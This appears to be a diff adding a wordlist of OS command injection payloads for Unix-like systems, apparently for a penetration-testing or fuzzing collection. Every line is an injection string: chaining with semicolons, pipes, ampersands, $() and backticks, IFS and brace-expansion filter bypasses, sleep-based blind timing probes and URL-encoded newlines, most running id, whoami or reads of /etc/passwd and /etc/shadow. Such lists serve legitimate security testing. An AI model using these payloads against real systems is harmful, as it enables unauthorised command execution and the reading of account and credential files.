@@ -1,0 +1,52 @@
+# Command Injection - Unix/Linux
+# Payloads for OS command injection on Unix-like systems
+# Various chaining operators and techniques
+; ls
+; ls -la
+; id
+; whoami
+; uname -a
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/hosts
+; ifconfig
+; ip addr
+; netstat -an
+; ps aux
+; env
+; printenv
+| ls
+| id
+| whoami
+| cat /etc/passwd
+| uname -a
+|| ls
+|| id
+|| whoami
+|| cat /etc/passwd
+&& ls
+&& id
+&& whoami
+&& cat /etc/passwd
+& ls
+& id
+& whoami
+$(whoami)
+$(id)
+$(cat /etc/passwd)
+$(uname -a)
+`whoami`
+`id`
+`cat /etc/passwd`
+`uname -a`
+;ls${IFS}-la
+;cat${IFS}/etc/passwd
+;{ls,-la}
+$(sleep 5)
+| sleep 5
+; sleep 5
+& sleep 5
+;echo${IFS}$(whoami)
+%0als
+%0aid
+%0acat%20/etc/passwd
